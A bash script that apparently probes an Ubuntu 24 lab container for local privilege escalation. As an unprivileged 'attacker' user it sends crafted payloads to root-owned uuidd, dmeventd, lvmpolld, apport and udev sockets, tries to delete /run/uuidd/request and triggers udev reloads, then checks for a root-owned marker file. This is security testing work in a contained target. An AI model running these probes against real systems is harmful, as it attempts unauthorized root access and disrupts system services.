#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

echo "== host/container proof =="
date -u +"utc=%Y-%m-%dT%H:%M:%SZ"
docker inspect "$container" --format 'container={{.Name}} id={{.Id}} image={{.Config.Image}} status={{.State.Status}} started={{.State.StartedAt}}'

docker exec -i "$container" bash -s <<'REMOTE'
set +e
export LC_ALL=C

section() {
  printf '\n== %s ==\n' "$*"
}

run_attacker() {
  printf '\n$ runuser -u attacker -- bash -lc %q\n' "$*"
  runuser -u attacker -- bash -lc "$*"
  rc=$?
  echo "rc=$rc"
}

marker=/root/codex-default-runtime-socket-root-proof
tmpmarker=/tmp/codex-default-runtime-socket-root-proof
crash=/var/crash/codex-default-runtime-socket.crash

section "os, attacker, and package versions"
sed -n '1,8p' /etc/os-release
id attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  uuid-runtime util-linux libuuid1 dmeventd lvm2 dmsetup systemd udev \
  apport apport-core-dump-handler python3-apport 2>&1 | sort

section "unit reachability and activation mapping"
for u in \
  uuidd.socket uuidd.service \
  dm-event.socket dm-event.service \
  lvm2-lvmpolld.socket lvm2-lvmpolld.service \
  apport-forward.socket apport-forward@.service apport.service \
  systemd-udevd-control.socket systemd-udevd.service
do
  echo "-- $u status --"
  systemctl status "$u" --no-pager 2>&1 | sed -n '1,22p'
  echo "-- $u unit --"
  systemctl cat "$u" --no-pager 2>&1 | sed -n '1,90p'
done

section "exact runtime socket modes"
for p in \
  /run/uuidd /run/uuidd/request \
  /run/dmeventd-client /run/dmeventd-server \
  /run/lvm /run/lvm/lvmpolld.socket \
  /run/apport.socket \
  /run/udev /run/udev/control
do
  if [ -e "$p" ]; then
    stat -Lc '%A %F %a %u:%g %U:%G %n' "$p"
  else
    echo "MISSING $p"
  fi
done

section "kernel unix listener table"
awk 'NR == 1 || /uuidd|dmeventd|lvmpolld|apport|udev\/control/ {print}' /proc/net/unix

section "root marker setup"
rm -f "$marker" "$tmpmarker" "$crash" /var/crash/codex-default-runtime-socket.upload /var/crash/codex-default-runtime-socket.uploaded
echo "root_marker=$marker"
echo "tmp_marker=$tmpmarker"
if [ -e "$marker" ]; then
  echo "marker_preexisting=yes"
else
  echo "marker_preexisting=no"
fi

section "uuidd world socket probes"
run_attacker '/usr/sbin/uuidd --time --uuids 2'
run_attacker '/usr/sbin/uuidd --random --uuids 2'
run_attacker 'python3 - <<'"'"'PY'"'"'
import socket, struct
path = "/run/uuidd/request"
payloads = [
    ("max-op", struct.pack("ii", 0x7fffffff, 1)),
    ("path-string", b"WRITE /root/codex-default-runtime-socket-root-proof\n"),
]
for name, payload in payloads:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(1.0)
    try:
        s.connect(path)
        print(f"{name}: connect=ok payload_len={len(payload)}")
        s.sendall(payload)
        try:
            data = s.recv(64)
            print(f"{name}: recv_len={len(data)} recv_hex={data.hex()}")
        except Exception as e:
            print(f"{name}: recv_error={type(e).__name__}:{e}")
    except Exception as e:
        print(f"{name}: connect_error={type(e).__name__}:{e}")
    finally:
        s.close()
PY'
run_attacker 'rm -f /run/uuidd/request 2>&1'

section "dmeventd fifo probes"
run_attacker 'printf "codex /root/codex-default-runtime-socket-root-proof\n" > /run/dmeventd-client'
run_attacker 'printf "codex /root/codex-default-runtime-socket-root-proof\n" > /run/dmeventd-server'
run_attacker 'timeout 2 bash -lc "cat /run/dmeventd-client > /tmp/codex-default-runtime-socket-dmeventd-client"'
run_attacker 'timeout 2 bash -lc "cat /run/dmeventd-server > /tmp/codex-default-runtime-socket-dmeventd-server"'
run_attacker '/usr/sbin/lvm version'
run_attacker '/usr/sbin/pvscan --cache'
run_attacker '/usr/sbin/lvs'
run_attacker '/usr/sbin/dmsetup version'

section "lvmpolld socket probes"
run_attacker 'python3 - <<'"'"'PY'"'"'
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(1.0)
try:
    s.connect("/run/lvm/lvmpolld.socket")
    print("connect=ok")
    s.sendall(b"/root/codex-default-runtime-socket-root-proof\n")
    try:
        data = s.recv(64)
        print("recv_len=%d recv_hex=%s" % (len(data), data.hex()))
    except Exception as e:
        print("recv_error=%s:%s" % (type(e).__name__, e))
except Exception as e:
    print("connect_error=%s:%s" % (type(e).__name__, e))
finally:
    s.close()
PY'
run_attacker '/usr/sbin/lvm fullreport --config "global { use_lvmpolld=1 }"'

section "apport socket probes"
run_attacker 'printf "ProblemType: Crash\nExecutablePath: /bin/false\nProcCmdline: /root/codex-default-runtime-socket-root-proof\n" > /var/crash/codex-default-runtime-socket.crash && ls -l /var/crash/codex-default-runtime-socket.crash'
run_attacker 'timeout 2 nc -U /run/apport.socket < /var/crash/codex-default-runtime-socket.crash'
run_attacker 'python3 - <<'"'"'PY'"'"'
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(1.0)
try:
    s.connect("/run/apport.socket")
    print("connect=ok")
    s.sendall(b"ProblemType: Crash\nProcCmdline: /root/codex-default-runtime-socket-root-proof\n\n")
    try:
        data = s.recv(64)
        print("recv_len=%d recv_hex=%s" % (len(data), data.hex()))
    except Exception as e:
        print("recv_error=%s:%s" % (type(e).__name__, e))
except Exception as e:
    print("connect_error=%s:%s" % (type(e).__name__, e))
finally:
    s.close()
PY'
run_attacker '/usr/bin/apport-cli -f -p bash --save /tmp/codex-default-runtime-socket-apport.crash >/tmp/codex-default-runtime-socket-apport.out 2>&1; rc=$?; echo apport_cli_rc=$rc; sed -n "1,40p" /tmp/codex-default-runtime-socket-apport.out; ls -l /tmp/codex-default-runtime-socket-apport.crash 2>&1'

section "udev control socket probes"
run_attacker '/usr/bin/udevadm control --ping'
run_attacker '/usr/bin/udevadm control --reload'
run_attacker '/usr/bin/udevadm trigger --action=add --subsystem-match=block'
run_attacker 'python3 - <<'"'"'PY'"'"'
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_SEQPACKET)
s.settimeout(1.0)
try:
    s.connect("/run/udev/control")
    print("seqpacket_connect=ok")
    s.sendall(b"RELOAD\0/root/codex-default-runtime-socket-root-proof\0")
    try:
        data = s.recv(64)
        print("recv_len=%d recv_hex=%s" % (len(data), data.hex()))
    except Exception as e:
        print("recv_error=%s:%s" % (type(e).__name__, e))
except Exception as e:
    print("connect_error=%s:%s" % (type(e).__name__, e))
finally:
    s.close()
PY'

section "post-trigger daemon state"
systemctl is-active uuidd.socket uuidd.service dm-event.socket dm-event.service lvm2-lvmpolld.socket lvm2-lvmpolld.service apport-forward.socket systemd-udevd-control.socket systemd-udevd.service 2>&1
ps -eo user:18,uid,pid,ppid,comm,args | awk 'NR == 1 || /[u]uidd|[d]meventd|[l]vmpolld|[a]pport|[u]devd/ {print}'
for p in /var/lib/libuuid /var/lib/libuuid/clock.txt "$crash" /tmp/codex-default-runtime-socket-apport.crash; do
  if [ -e "$p" ]; then
    stat -Lc '%A %F %a %u:%g %U:%G %s %n' "$p"
  else
    echo "MISSING $p"
  fi
done

section "root marker/root proof check"
if [ -e "$marker" ]; then
  echo "ROOT_MARKER_PRESENT"
  stat -Lc '%A %F %a %u:%g %U:%G %s %n' "$marker"
  sed -n '1,20p' "$marker"
else
  echo "ROOT_MARKER_ABSENT $marker"
fi
if [ -e "$tmpmarker" ]; then
  echo "TMP_MARKER_PRESENT"
  stat -Lc '%A %F %a %u:%g %U:%G %s %n' "$tmpmarker"
  sed -n '1,20p' "$tmpmarker"
else
  echo "TMP_MARKER_ABSENT $tmpmarker"
fi

section "cleanup"
rm -f "$marker" "$tmpmarker" "$crash" \
  /var/crash/codex-default-runtime-socket.upload \
  /var/crash/codex-default-runtime-socket.uploaded \
  /tmp/codex-default-runtime-socket-dmeventd-client \
  /tmp/codex-default-runtime-socket-dmeventd-server \
  /tmp/codex-default-runtime-socket-apport.crash \
  /tmp/codex-default-runtime-socket-apport.out
/usr/sbin/dmsetup remove codex_default_runtime_socket 2>/dev/null || true
for p in "$marker" "$tmpmarker" "$crash" /tmp/codex-default-runtime-socket-apport.crash; do
  [ -e "$p" ] && echo "leftover $p" || echo "removed_or_absent $p"
done
REMOTE
